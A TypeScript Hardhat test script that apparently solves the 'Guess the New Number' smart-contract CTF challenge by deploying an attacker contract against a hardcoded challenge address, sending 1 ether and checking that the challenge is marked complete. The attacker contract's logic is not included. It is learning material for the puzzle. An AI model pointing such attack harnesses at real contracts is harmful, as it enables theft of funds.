import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract
let attacker: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory("GuessTheNewNumberChallenge");
  contract = challengeFactory.attach(`0x93c69C5aFAF1E306DD193B9CE3BF1c9eb70857c7`);

  const attackerFactory = await ethers.getContractFactory("GuessTheNewNumberAttacker");
  attacker = await attackerFactory.deploy(contract.address, {});
  // attacker = await attackerFactory.attach(`0xe9cea8b7167f2017e30d37170f6201f3ea731a68`)
});

it("solves the challenge", async function () {
  const tx = await attacker.attack({
    value: ethers.utils.parseEther(`1`),
  });
  const txHash = tx && tx.hash;
  console.log(formatEtherscanTx(txHash));

  const isComplete = await contract.isComplete()
  expect(isComplete).to.be.true;
});
